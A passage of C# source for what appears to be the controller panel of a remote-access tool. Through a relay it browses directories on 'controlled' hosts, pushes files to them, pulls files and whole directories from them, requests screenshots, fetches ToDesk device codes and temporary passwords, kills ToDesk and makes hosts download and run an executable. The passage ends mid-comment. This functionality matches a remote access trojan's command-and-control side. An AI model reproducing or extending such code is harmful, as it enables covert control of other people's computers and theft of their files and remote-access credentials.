        {
            byte[] buf = new byte[len];

            int got = 0;

            while (got < len)
            {
                int n = stream.Read(buf, got, len - got);

                if (n <= 0)
                    return null;

                got += n;
            }

            return buf;
        }

        // =========================
        // 日志
        // =========================
        public void AppendLog(string msg)
        {
            if (richTextBoxPlus1.InvokeRequired)
            {
                richTextBoxPlus1.Invoke(new Action(() => AppendLog(msg)));
                return;
            }

            Color color;
            string prefix;
            string m = msg.ToLower();

            if (m.Contains("上线") || m.Contains("已就绪") || m.Contains("成功") ||
                m.Contains("完成") || m.Contains("ok:") || m.Contains("已添加") || m.Contains("已保存"))
            {
                color = Color.FromArgb(0, 150, 60);
                prefix = "√ ";
            }
            else if (m.Contains("离线") || m.Contains("失败") || m.Contains("错误") ||
                     m.Contains("error") || m.Contains("异常"))
            {
                color = Color.FromArgb(200, 30, 30);
                prefix = "✗ ";
            }
            else if (m.Contains("重试") || m.Contains("超时") || m.Contains("警告"))
            {
                color = Color.FromArgb(200, 120, 0);
                prefix = "! ";
            }
            else if (m.Contains("设备代码") || m.Contains("临时密码"))
            {
                color = Color.FromArgb(180, 0, 180);
                prefix = "★ ";
            }
            else if (m.Contains("截图") || m.Contains("下载") || m.Contains("发送") ||
                     m.Contains("传输") || m.Contains("接收"))
            {
                color = Color.FromArgb(0, 100, 200);
                prefix = "→ ";
            }

            else if (m.Contains("重试") || m.Contains("超时") || m.Contains("警告") || m.Contains("自动重连"))
            {
                color = Color.FromArgb(200, 120, 0);
                prefix = "! ";
            }

            else
            {
                color = richTextBoxPlus1.ForeColor;
                prefix = "· ";
            }

            richTextBoxPlus1.AppendText(prefix + msg + "\r\n", color);
        }

        // =========================
        // 关闭程序
        // =========================
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
        }

        private void button7_Click(object sender, EventArgs e)
        {
            if (!CheckConnected()) return;
            string path = Microsoft.VisualBasic.Interaction.InputBox(
                "请输入要查看的目录路径：", "浏览目录", @"C:\");
            if (string.IsNullOrEmpty(path)) return;
            SendPacket(_controlledClient.GetStream(),
                CMD_LIST_DIR, Encoding.UTF8.GetBytes(path));
            AppendLog($"已发送浏览目录指令：{path}");
        }

        private void SendPacketDirect(NetworkStream stream, uint cmd, byte[] data)
        {
            // ★ 一次性组包发送，避免多次Write之间连接状态变化
            byte[] magic = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(unchecked((int)MAGIC)));
            byte[] cmdBytes = BitConverter.GetBytes(IPAddress.HostToNetworkOrder((int)cmd));
            byte[] lenBytes = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(data.Length));

            byte[] packet = new byte[12 + data.Length];
            Buffer.BlockCopy(magic, 0, packet, 0, 4);
            Buffer.BlockCopy(cmdBytes, 0, packet, 4, 4);
            Buffer.BlockCopy(lenBytes, 0, packet, 8, 4);
            if (data.Length > 0)
                Buffer.BlockCopy(data, 0, packet, 12, data.Length);

            stream.Write(packet, 0, packet.Length);
        }
        private void SendFileToBgent(string localPath)
        {
            try
            {
                Thread.Sleep(2000); // 等被控端启动监听

                string fileName = Path.GetFileName(localPath);
                long totalSize = new FileInfo(localPath).Length;
                byte[] nameBytes = Encoding.UTF8.GetBytes(fileName);

                TcpClient client = new TcpClient();
                client.SendBufferSize = 1024 * 1024;
                client.ReceiveBufferSize = 1024 * 1024;
                client.Connect(RELAY_IP, FILE_SEND_PORT);
                NetworkStream stream = client.GetStream();

                // ★ 断点续传握手：先发文件名查询包
                SendPacketDirect(stream, CMD_FILE_HELLO, Encoding.UTF8.GetBytes("CTRL:" + GetCurrentAgentUniqueId()));

                // 等被控端回复已有大小（8字节）
                byte[] offBuf = new byte[8];
                int got = 0;
                while (got < 8)
                {
                    int n = stream.Read(offBuf, got, 8 - got);
                    if (n <= 0) break;
                    got += n;
                }
                byte[] tmp = (byte[])offBuf.Clone();
                if (BitConverter.IsLittleEndian) Array.Reverse(tmp);
                long resumeOffset = BitConverter.ToInt64(tmp, 0);

                if (resumeOffset > 0)
                    AppendLog($"[文件发送] 断点续传，已有: {FormatSize(resumeOffset)}，从此处继续");
                else
                    AppendLog($"[文件发送] 开始发送: {fileName}  总大小: {FormatSize(totalSize)}");

                // 发送 CMD_FILE_BEGIN（含续传偏移）
                byte[] beginPkt = new byte[16 + nameBytes.Length];
                byte[] netTotal = BitConverter.GetBytes(totalSize);
                byte[] netOffset = BitConverter.GetBytes(resumeOffset);
                if (BitConverter.IsLittleEndian) { Array.Reverse(netTotal); Array.Reverse(netOffset); }
                Buffer.BlockCopy(netTotal, 0, beginPkt, 0, 8);
                Buffer.BlockCopy(netOffset, 0, beginPkt, 8, 8);
                Buffer.BlockCopy(nameBytes, 0, beginPkt, 16, nameBytes.Length);
                SendPacketDirect(stream, CMD_FILE_BEGIN, beginPkt);

                const int CHUNK = 512 * 1024;
                byte[] buf = new byte[CHUNK];
                long sent = resumeOffset;
                var sw = System.Diagnostics.Stopwatch.StartNew();
                long lastBytes = resumeOffset;
                long lastMs = 0;

                using (FileStream fs = new FileStream(localPath, FileMode.Open, FileAccess.Read))
                {
                    if (resumeOffset > 0) fs.Seek(resumeOffset, SeekOrigin.Begin);

                    while (sent < totalSize)
                    {
                        int toRead = (int)Math.Min(CHUNK, totalSize - sent);
                        int didRead = fs.Read(buf, 0, toRead);
                        if (didRead == 0) break;

                        byte[] chunk = new byte[didRead];
                        Buffer.BlockCopy(buf, 0, chunk, 0, didRead);
                        SendPacketDirect(stream, CMD_FILE_CHUNK, chunk);
                        sent += didRead;

                        long nowMs = sw.ElapsedMilliseconds;
                        if (nowMs - lastMs >= 1000)
                        {
                            long speed = (sent - lastBytes) * 1000 / Math.Max(1, nowMs - lastMs);
                            long remaining = totalSize - sent;
                            string speedStr = FormatSize(speed) + "/s";
                            string remainStr = FormatRemaining(remaining, speed);
                            AppendLog($"[文件发送] {fileName}  {FormatSize(sent)} / {FormatSize(totalSize)}  速度: {speedStr}  剩余: {remainStr}");
                            lastMs = nowMs;
                            lastBytes = sent;
                        }
                    }
                }

                SendPacketDirect(stream, CMD_FILE_END, new byte[0]);
                AppendLog($"[文件发送完成] {fileName}  共 {FormatSize(sent)}");
                client.Close();
            }
            catch (Exception ex)
            {
                AppendLog("[文件发送] 失败: " + ex.Message);
            }
        }

        // 支持指定目标主机的版本（菜单批量发送用）
        public void SendFileToBgentToHost(string localPath, HostInfo host, string remoteSavePath = "")
        {
            string taskId = Guid.NewGuid().ToString("N").Substring(0, 16);
            string fileName = System.IO.Path.GetFileName(localPath);

            // ★ 先通过9003告知被控端准备接收，携带TaskID和保存路径
            string cmdPayload = remoteSavePath + "|" + taskId;
            SendCmdToHost(host, CMD_SEND_FILE, Encoding.UTF8.GetBytes(cmdPayload));

            string capturedTaskId = taskId;
            Thread t = new Thread(() =>
            {
                long sent = 0;
                try
                {
                    System.Threading.Thread.Sleep(500); // 等被控端连9002

                    long totalSize = new System.IO.FileInfo(localPath).Length;
                    byte[] nameBytes = Encoding.UTF8.GetBytes(fileName);

                    TcpClient client = new TcpClient();
                    client.SendBufferSize = 4 * 1024 * 1024;
                    client.ReceiveBufferSize = 4 * 1024 * 1024;
                    client.Connect(RELAY_IP, FILE_SEND_PORT); // 9002
                    NetworkStream stream = client.GetStream();

                    // ★ 新握手格式：CTRL|UniqueKey|TaskID
                    string hello = $"CTRL|{host.UniqueId}|{capturedTaskId}";
                    SendPacketDirect(stream, CMD_FILE_HELLO, Encoding.UTF8.GetBytes(hello));

                    // ★ 等 PAIR_OK
                    client.ReceiveTimeout = 30000;
                    uint pairCmd; byte[] pairData;
                    if (!RecvPacket(stream, out pairCmd, out pairData) || pairCmd != CMD_PAIR_OK)
                    {
                        AppendLog($"[{host.HostName}] 文件推送9002配对失败");
                        client.Close();
                        return;
                    }
                    client.ReceiveTimeout = 0;

                    AppendLog($"[{host.HostName}] [文件发送] 开始: {fileName}  {FormatSize(totalSize)}");

                    byte[] beginPkt = new byte[16 + nameBytes.Length];
                    byte[] netTotal = BitConverter.GetBytes(totalSize);
                    byte[] netOffset = BitConverter.GetBytes((long)0);
                    if (BitConverter.IsLittleEndian) { Array.Reverse(netTotal); Array.Reverse(netOffset); }
                    Buffer.BlockCopy(netTotal, 0, beginPkt, 0, 8);
                    Buffer.BlockCopy(netOffset, 0, beginPkt, 8, 8);
                    Buffer.BlockCopy(nameBytes, 0, beginPkt, 16, nameBytes.Length);
                    SendPacketDirect(stream, CMD_FILE_BEGIN, beginPkt);

                    const int CHUNK = 512 * 1024;
                    byte[] buf = new byte[CHUNK];
                    var sw = System.Diagnostics.Stopwatch.StartNew();
                    long lastBytes = 0, lastMs = 0;

                    using (System.IO.FileStream fs = new System.IO.FileStream(localPath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
                    {
                        while (sent < totalSize)
                        {
                            int toRead = (int)Math.Min(CHUNK, totalSize - sent);
                            int didRead = fs.Read(buf, 0, toRead);
                            if (didRead == 0) break;
                            byte[] chunk = new byte[didRead];
                            Buffer.BlockCopy(buf, 0, chunk, 0, didRead);
                            SendPacketDirect(stream, CMD_FILE_CHUNK, chunk);
                            sent += didRead;

                            long nowMs = sw.ElapsedMilliseconds;
                            if (nowMs - lastMs >= 1000)
                            {
                                long speed = (sent - lastBytes) * 1000 / Math.Max(1, nowMs - lastMs);
                                AppendLog($"[{host.HostName}] [文件发送] {fileName}  {FormatSize(sent)}/{FormatSize(totalSize)}  {FormatSize(speed)}/s");
                                lastMs = nowMs; lastBytes = sent;
                            }
                        }
                    }

                    SendPacketDirect(stream, CMD_FILE_END, new byte[0]);
                    AppendLog($"[{host.HostName}] [文件发送完成] {fileName}  {FormatSize(sent)}");
                    client.Close();
                }
                catch (Exception ex)
                {
                    AppendLog($"[{host.HostName}] [文件发送失败] {ex.Message}");
                }
            });
            t.IsBackground = true;
            t.Start();
        }

        private string GetCurrentAgentUniqueId()
        {
            if (_controlledClient == null) return "";
            HostInfo h = _hostList.Find(x => x.Client == _controlledClient);
            return h?.UniqueId ?? "";
        }

        // 接收文件到指定目录（TaskID版，供ReceiveFileForm使用）
        public void WaitAndRecvFileToDirWithTaskId(string uniqueId, string taskId, string saveDir)
        {
            TcpClient client = null;
            try
            {
                client = new TcpClient();
                client.SendBufferSize = 1024 * 1024;
                client.ReceiveBufferSize = 1024 * 1024;
                client.Connect(RELAY_IP, FILE_PORT); // 9001

                NetworkStream stream = client.GetStream();

                // ★ 新握手格式：CTRL|UniqueKey|TaskID
                string hello = $"CTRL|{uniqueId}|{taskId}";
                SendPacketDirect(stream, CMD_FILE_HELLO, Encoding.UTF8.GetBytes(hello));

                // ★ 等 PAIR_OK，30秒超时
                client.ReceiveTimeout = 30000;
                uint pairCmd; byte[] pairData;
                if (!RecvPacket(stream, out pairCmd, out pairData) || pairCmd != CMD_PAIR_OK)
                {
                    AppendLog($"[文件接收] 9001配对失败或超时 taskId={taskId}");
                    return;
                }
                client.ReceiveTimeout = 0;

                // 等 FILE_BEGIN
                uint cmd; byte[] data;
                if (!RecvPacket(stream, out cmd, out data)) return;
                if (cmd != CMD_FILE_BEGIN)
                {
                    AppendLog($"[文件接收] 收到未知包: 0x{cmd:X}");
                    return;
                }

                // 解析文件头，保存到指定目录
                if (data.Length < 17) return;
                byte[] totalBuf = new byte[8], offsetBuf = new byte[8];
                Buffer.BlockCopy(data, 0, totalBuf, 0, 8);
                Buffer.BlockCopy(data, 8, offsetBuf, 0, 8);
                if (BitConverter.IsLittleEndian) { Array.Reverse(totalBuf); Array.Reverse(offsetBuf); }
                long totalSize = BitConverter.ToInt64(totalBuf, 0);
                long startOffset = BitConverter.ToInt64(offsetBuf, 0);
                string fnameUtf8 = Encoding.UTF8.GetString(data, 16, data.Length - 16);

                string savePath = Path.Combine(saveDir, Path.GetFileName(fnameUtf8));
                string partPath = savePath + ".part";
                AppendLog($"[文件接收] 开始: {fnameUtf8}  总大小: {FormatSize(totalSize)}  保存至: {savePath}");

                FileStream fs = null;
                try
                {
                    fs = new FileStream(partPath,
                        startOffset > 0 ? FileMode.Append : FileMode.Create,
                        FileAccess.Write);
                }
                catch (Exception ex)
                {
                    AppendLog("[文件接收] 创建文件失败: " + ex.Message);
                    return;
                }

                long received = startOffset;
                var sw = System.Diagnostics.Stopwatch.StartNew();
                long lastBytes = startOffset, lastMs = 0;

                try
                {
                    while (received < totalSize)
                    {
                        uint chunkCmd; byte[] chunkData;
                        if (!RecvPacket(stream, out chunkCmd, out chunkData)) break;
                        if (chunkCmd == CMD_FILE_END) break;
                        if (chunkCmd != CMD_FILE_CHUNK) continue;
                        fs.Write(chunkData, 0, chunkData.Length);
                        received += chunkData.Length;

                        long nowMs = sw.ElapsedMilliseconds;
                        if (nowMs - lastMs >= 1000)
                        {
                            long speed = (received - lastBytes) * 1000 / Math.Max(1, nowMs - lastMs);
                            AppendLog($"[文件接收] {fnameUtf8}  " +
                                      $"{FormatSize(received)}/{FormatSize(totalSize)}  " +
                                      $"{FormatSize(speed)}/s");
                            lastMs = nowMs; lastBytes = received;
                        }
                    }
                }
                finally { fs.Close(); }

                if (File.Exists(savePath)) File.Delete(savePath);
                File.Move(partPath, savePath);
                AppendLog($"[文件接收完成] {savePath}  大小: {FormatSize(received)}");

                string ext = Path.GetExtension(fnameUtf8).ToLower();
                if (ext == ".jpg" || ext == ".bmp" || ext == ".png")
                    System.Diagnostics.Process.Start(savePath);
            }
            catch (Exception ex)
            {
                AppendLog("[文件接收] 异常: " + ex.Message);
            }
            finally
            {
                client?.Close();
            }
        }

        // 接收文件并保存到指定目录（ReceiveFileForm使用）
        public void WaitAndRecvFileToDir(long resumeOffset, string saveDir, string uniqueId = "")
        {
            try
            {
                TcpClient client = new TcpClient();
                client.SendBufferSize = 1024 * 1024;
                client.ReceiveBufferSize = 1024 * 1024;
                client.Connect(RELAY_IP, FILE_PORT);
                NetworkStream stream = client.GetStream();

                // ★ 删掉原来的 string uniqueId = ... 那行，直接用参数传进来的uniqueId
                SendPacketDirect(stream, CMD_FILE_HELLO,
                    Encoding.UTF8.GetBytes("CTRL:" + uniqueId));

                Thread.Sleep(500);

                uint cmd; byte[] data;
                if (!RecvPacket(stream, out cmd, out data)) return;
                if (cmd != CMD_FILE_BEGIN) return;

                if (data.Length < 17) return;
                byte[] totalBuf = new byte[8], offsetBuf = new byte[8];
                Buffer.BlockCopy(data, 0, totalBuf, 0, 8);
                Buffer.BlockCopy(data, 8, offsetBuf, 0, 8);
                if (BitConverter.IsLittleEndian) { Array.Reverse(totalBuf); Array.Reverse(offsetBuf); }
                long totalSize = BitConverter.ToInt64(totalBuf, 0);
                long startOffset = BitConverter.ToInt64(offsetBuf, 0);
                string fnameUtf8 = Encoding.UTF8.GetString(data, 16, data.Length - 16);

                string savePath = Path.Combine(saveDir, Path.GetFileName(fnameUtf8));
                string partPath = savePath + ".part";
                AppendLog($"[文件接收] 开始: {fnameUtf8}  保存至: {savePath}");

                FileStream fs = new FileStream(partPath,
                    startOffset > 0 ? FileMode.Append : FileMode.Create,
                    FileAccess.Write);
                long received = startOffset;
                try
                {
                    while (received < totalSize)
                    {
                        uint chunkCmd; byte[] chunkData;
                        if (!RecvPacket(stream, out chunkCmd, out chunkData)) break;
                        if (chunkCmd == CMD_FILE_END) break;
                        if (chunkCmd != CMD_FILE_CHUNK) continue;
                        fs.Write(chunkData, 0, chunkData.Length);
                        received += chunkData.Length;
                    }
                }
                finally { fs.Close(); }

                if (File.Exists(savePath)) File.Delete(savePath);
                File.Move(partPath, savePath);
                AppendLog($"[文件接收完成] {savePath}  大小: {FormatSize(received)}");

                string ext = Path.GetExtension(fnameUtf8).ToLower();
                if (ext == ".jpg" || ext == ".bmp" || ext == ".png")
                    System.Diagnostics.Process.Start(savePath);

                client.Close();
            }
            catch (Exception ex)
            {
                AppendLog("[文件接收] 失败: " + ex.Message);
            }
        }

        private void WaitAndRecvFile(long resumeOffset, string uniqueId)
        {
            try
            {
                TcpClient client = new TcpClient();
                client.SendBufferSize = 1024 * 1024;
                client.ReceiveBufferSize = 1024 * 1024;
                client.Connect(RELAY_IP, FILE_PORT);
                NetworkStream stream = client.GetStream();

                // ★ 删掉原来的 string uniqueId = ... 那行，直接用参数传进来的uniqueId
                SendPacketDirect(stream, CMD_FILE_HELLO,
                    Encoding.UTF8.GetBytes("CTRL:" + uniqueId));

                

                uint cmd; byte[] data;
                if (!RecvPacket(stream, out cmd, out data)) return;
                if (cmd != CMD_FILE_BEGIN) return;

                HandleFileBegin(stream, data);

                client.Close();
            }
            catch (Exception ex)
            {
                AppendLog("[文件接收] 失败: " + ex.Message);
            }
        }

        private void WaitAndRecvDirWithTaskId(HostInfo host, string dirTaskId)
        {
            // 注册本次传输状态
            var state = new DirTransferState { DirTaskId = dirTaskId };
            _activeDirTransfers[dirTaskId] = state;

            try
            {
                // 等 HandleDirFileCount 收到文件总数（最多10秒）
                if (!state.CountReceived.Wait(10000))
                {
                    AppendLog($"[目录传输] 未收到文件数量通知，放弃 taskId={dirTaskId}");
                    return;
                }

                int totalFiles = state.TotalFiles;
                string dirName = state.DirName;
                AppendLog($"[{host.HostName}] [目录传输] 开始接收: {dirName}  共 {totalFiles} 个文件");

                SendCmdToHost(host, CMD_DIR_READY, Encoding.UTF8.GetBytes(dirTaskId));

                // ★ 等被控端收到CMD_DIR_READY并连上relay
                Thread.Sleep(100);

                using (var countdown = new System.Threading.CountdownEvent(totalFiles))
                {
                    for (int i = 0; i < totalFiles; i++)
                    {
                        int fileIndex = i;
                        string fileTaskId = dirTaskId + "_" + fileIndex;
                        string capturedDirName = dirName;
                        int capturedTotal = totalFiles;

                        Thread ft = new Thread(() =>
                        {
                            try
                            {
                                RecvOneDirFile(host.UniqueId, fileTaskId, capturedDirName,
                                    fileIndex, capturedTotal);
                            }
                            finally
                            {
                                countdown.Signal();
                            }
                        });
                        ft.IsBackground = true;
                        ft.Start();
                    }

                    // 等所有文件接收完成，最多等 totalFiles * 60 秒
                    bool allDone = countdown.Wait(totalFiles * 60000);
                    if (allDone)
                        AppendLog($"[目录传输完成] {dirName}  共 {totalFiles} 个文件");
                    else
                        AppendLog($"[目录传输] 超时，部分文件可能未完成 taskId={dirTaskId}");
                }
            }
            finally
            {
                _activeDirTransfers.TryRemove(dirTaskId, out _);
            }
        }


        // 收到被控端发来的目录文件总数通知
        private void HandleDirFileCount(byte[] data)
        {
            string msg = Encoding.UTF8.GetString(data);
            if (msg.StartsWith("ERROR:"))
            {
                AppendLog($"[目录传输] {msg.Substring(6)}");
                return;
            }

            // ★ 新格式：目录名\n文件总数\nDirTaskID
            string[] parts = msg.Split('\n');
            if (parts.Length < 3)
            {
                AppendLog($"[目录传输] DIR_FILE_COUNT格式错误: {msg}");
                return;
            }

            string dirName = parts[0];
            int totalFiles = int.TryParse(parts[1], out int n) ? n : 0;
            string dirTaskId = parts[2].Trim();

            if (_activeDirTransfers.TryGetValue(dirTaskId, out DirTransferState state))
            {
                state.DirName = dirName;
                state.TotalFiles = totalFiles;
                state.CountReceived.Set(); // 通知等待线程
            }
            else
            {
                AppendLog($"[目录传输] 收到未知taskId的文件数通知: {dirTaskId}");
            }
        }
        // 目录传输状态（本次传输的局部状态，不再用全局字段）
        private class DirTransferState
        {
            public string DirTaskId;
            public string DirName;
            public int TotalFiles;
            // 用于等待 CMD_DIR_FILE_COUNT 包
            public System.Threading.ManualResetEventSlim CountReceived
                = new System.Threading.ManualResetEventSlim(false);
        }

        // 接收目录中单个文件的数据（从已配对的stream读取）
        // 原 HandleDirFileBegin 逻辑提取为独立方法，不再依赖外部stream参数
        private void HandleDirFileBeginFromStream(NetworkStream stream, byte[] beginData,
            int fileIndex, int totalFiles)
        {
            if (beginData.Length < 17) return;

            byte[] totalBuf = new byte[8], offsetBuf = new byte[8];
            Buffer.BlockCopy(beginData, 0, totalBuf, 0, 8);
            Buffer.BlockCopy(beginData, 8, offsetBuf, 0, 8);
            if (BitConverter.IsLittleEndian) { Array.Reverse(totalBuf); Array.Reverse(offsetBuf); }

            long totalSize = BitConverter.ToInt64(totalBuf, 0);
            // 文件名含相对路径，如 "MyDir\sub\file.txt"
            string relPath = Encoding.UTF8.GetString(beginData, 16, beginData.Length - 16);

            // 保存路径：程序目录 + 相对路径，自动创建子目录
            string savePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, relPath);
            string saveDir = Path.GetDirectoryName(savePath);
            if (!Directory.Exists(saveDir)) Directory.CreateDirectory(saveDir);

            string partPath = savePath + ".part";

            FileStream fs = null;
            try
            {
                fs = new FileStream(partPath, FileMode.Create, FileAccess.Write);
            }
            catch (Exception ex)
            {
                AppendLog($"[目录传输] 创建文件失败: {relPath}  {ex.Message}");
                return;
            }

            long received = 0;
            var sw = System.Diagnostics.Stopwatch.StartNew();
            long lastBytes = 0, lastMs = 0;

            try
            {
                while (received < totalSize)
                {
                    uint chunkCmd; byte[] chunkData;
                    if (!RecvPacket(stream, out chunkCmd, out chunkData)) break;
                    if (chunkCmd == CMD_FILE_END) break;
                    if (chunkCmd != CMD_FILE_CHUNK) continue;

                    fs.Write(chunkData, 0, chunkData.Length);
                    received += chunkData.Length;

                    long nowMs = sw.ElapsedMilliseconds;
                    if (nowMs - lastMs >= 1000)
                    {
                        long speed = (received - lastBytes) * 1000 / Math.Max(1, nowMs - lastMs);
                        AppendLog($"[目录传输] ({fileIndex + 1}/{totalFiles}) {relPath}  " +
                                  $"{FormatSize(received)}/{FormatSize(totalSize)}  " +
                                  $"{FormatSize(speed)}/s");
                        lastMs = nowMs; lastBytes = received;
                    }
                }
            }
            finally { fs.Close(); }

            if (File.Exists(savePath)) File.Delete(savePath);
            File.Move(partPath, savePath);

            AppendLog($"[目录传输] ({fileIndex + 1}/{totalFiles}) 完成: {relPath}  {FormatSize(received)}");
        }

        // 接收目录中单个文件（每个文件独立线程调用）
        private void RecvOneDirFile(string uniqueId, string fileTaskId,
    string dirName, int fileIndex, int totalFiles)
        {
            const int maxRetries = 3;
            for (int retry = 0; retry < maxRetries; retry++)
            {
                TcpClient client = null;
                NetworkStream stream = null;
                try
                {
                    client = new TcpClient();
                    client.SendBufferSize = 1024 * 1024;
                    client.ReceiveBufferSize = 1024 * 1024;

                    // ★ 第一次等久一点，重试时递增等待
                    Thread.Sleep(retry == 0 ? 800 : 500 * retry);

                    client.Connect(RELAY_IP, FILE_PORT); // 9001
                    stream = client.GetStream();

                    string hello = $"CTRL|{uniqueId}|{fileTaskId}";
                    SendPacketDirect(stream, CMD_FILE_HELLO, Encoding.UTF8.GetBytes(hello));

                    // ★ 超时改为60秒
                    client.ReceiveTimeout = 60000;
                    uint pairCmd; byte[] pairData;
                    if (!RecvPacket(stream, out pairCmd, out pairData) || pairCmd != CMD_PAIR_OK)
                    {
                        AppendLog($"[目录传输] 文件#{fileIndex} 配对失败 (重试{retry + 1}/{maxRetries}) taskId={fileTaskId}");
                        continue; // ★ 重试
                    }
                    client.ReceiveTimeout = 0;

                    uint cmd; byte[] data;
                    if (!RecvPacket(stream, out cmd, out data) || cmd != CMD_FILE_BEGIN)
                    {
                        AppendLog($"[目录传输] 文件#{fileIndex} 未收到FILE_BEGIN (重试{retry + 1}/{maxRetries})");
                        continue; // ★ 重试
                    }

                    HandleDirFileBeginFromStream(stream, data, fileIndex, totalFiles);

                    // ★ 成功，显式释放资源
                    stream.Close();
                    client.Close();
                    return; // ★ 成功退出
                }
                catch (Exception ex)
                {
                    AppendLog($"[目录传输] 文件#{fileIndex} 异常(重试{retry + 1}/{maxRetries}): {ex.Message}");
                }
                finally
                {
                    // ★ 确保异常时也释放
                    try { stream?.Close(); } catch { }
                    try { client?.Close(); } catch { }
                }
            }

            AppendLog($"[目录传输] 文件#{fileIndex} 重试{maxRetries}次均失败，放弃 taskId={fileTaskId}");
        }
        // 截图类通用封装（三种截图都用这个）
        private string SendScreenshotCmd(HostInfo host, uint screenshotCmd)
        {
            string taskId = Guid.NewGuid().ToString("N").Substring(0, 16);
            SendCmdToHost(host, screenshotCmd, Encoding.UTF8.GetBytes(taskId));
            return taskId;
        }

        private void RequestFileFromAgent(HostInfo host, string remotePath, long resumeOffset)
        {
            string taskId = Guid.NewGuid().ToString("N").Substring(0, 16);
            // 格式：文件路径|TaskID
            string payload = remotePath + "|" + taskId;
            SendCmdToHost(host, CMD_REQUEST_FILE, Encoding.UTF8.GetBytes(payload));

            string capturedTaskId = taskId;
            string capturedUniqueId = host.UniqueId;
            Thread t = new Thread(() => WaitAndRecvFileWithTaskId(capturedUniqueId, capturedTaskId));
            t.IsBackground = true;
            t.Start();
        }

        private void WaitAndRecvFileWithTaskId(string uniqueId, string taskId, string tag = "")
        {
            TcpClient client = null;
            try
            {
                client = new TcpClient();
                client.SendBufferSize = 1024 * 1024;
                client.ReceiveBufferSize = 1024 * 1024;
                client.Connect(RELAY_IP, FILE_PORT); // 9001

                NetworkStream stream = client.GetStream();

                // ★ 新握手格式：CTRL|UniqueKey|TaskID
                string hello = $"CTRL|{uniqueId}|{taskId}";
                SendPacketDirect(stream, CMD_FILE_HELLO, Encoding.UTF8.GetBytes(hello));

                // ★ 等服务端回 PAIR_OK，超时30秒
                client.ReceiveTimeout = 30000;
                uint pairCmd; byte[] pairData;
                if (!RecvPacket(stream, out pairCmd, out pairData) || pairCmd != CMD_PAIR_OK)
                {
                    AppendLog($"{tag}[文件接收] 9001配对失败或超时 taskId={taskId}");
                    return;
                }
                client.ReceiveTimeout = 0;

                // 配对成功，开始接收文件
                uint cmd; byte[] data;
                if (!RecvPacket(stream, out cmd, out data)) return;
                if (cmd != CMD_FILE_BEGIN)
                {
                    AppendLog($"{tag}[文件接收] 收到未知包: 0x{cmd:X}");
                    return;
                }
                HandleFileBegin(stream, data);
            }
            catch (Exception ex)
            {
                AppendLog($"{tag}[文件接收] 异常: {ex.Message}");
            }
            finally
            {
                client?.Close();
            }
        }
        private void WaitAndRecvFileForHost(string uniqueId)
        {
            TcpClient client = null;
            try
            {
                client = new TcpClient();
                client.SendBufferSize = 1024 * 1024;
                client.ReceiveBufferSize = 1024 * 1024;
                client.ReceiveTimeout = 30000;
                client.Connect(RELAY_IP, FILE_PORT);

                NetworkStream stream = client.GetStream();
                SendPacketDirect(stream, CMD_FILE_HELLO,
                    Encoding.UTF8.GetBytes("CTRL:" + uniqueId));
                Thread.Sleep(500);
                uint cmd; byte[] data;
                if (!RecvPacket(stream, out cmd, out data))
                {
                    AppendLog("[文件接收] 失败");
                    return;
                }
                if (cmd != CMD_FILE_BEGIN)
                {
                    AppendLog($"[文件接收] 收到未知包: 0x{cmd:X}");
                    return;
                }
                HandleFileBegin(stream, data);
            }
            catch (Exception ex)
            {
                AppendLog("[文件接收] 异常: " + ex.Message);
            }
            finally
            {
                client?.Close();
            }
        }

        // 以截图ToDesk为例，其他两个同理
        private void 获取todesk截图ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先在列表中选择被控端"); return; }
            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                string taskId = Guid.NewGuid().ToString("N").Substring(0, 16);
                SendCmdToHost(host, CMD_GET_TODESK_INFO, Encoding.UTF8.GetBytes(taskId));
                AppendLog($"[{host.HostName}] 已发送获取ToDesk信息指令 taskId={taskId}");
            }
        }

        private void 结束todesk进程ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0)
            {
                AppendLog("请先在列表中选择被控端");
                return;
            }

            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 已发送结束ToDesk进程指令");
                SendCmdToHost(host, CMD_KILL_TODESK, new byte[0]);
            }
        }

        private void contextMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
            // 没有数据或没有选中行时，取消弹出右键菜单
            if (objectListView.Items.Count == 0 || objectListView.SelectedObjects.Count == 0)
            {
                e.Cancel = true;
            }
        }

        private void 下载todeskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

            // USER_DESKTOP：被控端会自动识别PE或正常系统的当前用户桌面
            // "!" 作为 silentArgs：被控端下载完后直接运行（无参数启动），不等待退出
            string payload = "USER_DESKTOP\nhttps://newdl.todesk.com/windows/ToDesk_Lite.exe !";
            byte[] data = Encoding.UTF8.GetBytes(payload);
            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 开始下载ToDesk精简版到桌面并打开...");
                SendCmdToHost(host, CMD_DOWNLOAD_TODESK, data);
            }
        }

        private void 下载文件ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DownloadForm dlForm = new DownloadForm();
            dlForm.ShowDialog(this);
        }

        private void 下载连连控ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

            // USER_DESKTOP\n完整文件保存路径（含自定义文件名）\nurl /S
            // savePath 指定完整路径（含文件名），被控端 DownloadAndRunEx 识别有扩展名则直接用
            // 注意格式：savePath 和 urlWithArgs 之间用 \n 分隔
            // savePath = USER_DESKTOP\AskLink_zyck4096.exe（控制端拼接桌面路径+自定义文件名）
            // 但被控端 ResolveSysPath 只解析标识符，不能在标识符后拼路径
            // ★ 所以 savePath 这里传完整的通配路径写法：
            //   被控端 savePathIn = "USER_DESKTOP\AskLink_zyck4096.exe"
            //   ResolveSysPath("USER_DESKTOP\AskLink_zyck4096.exe") → 不是纯标识符 → 直接返回原字符串
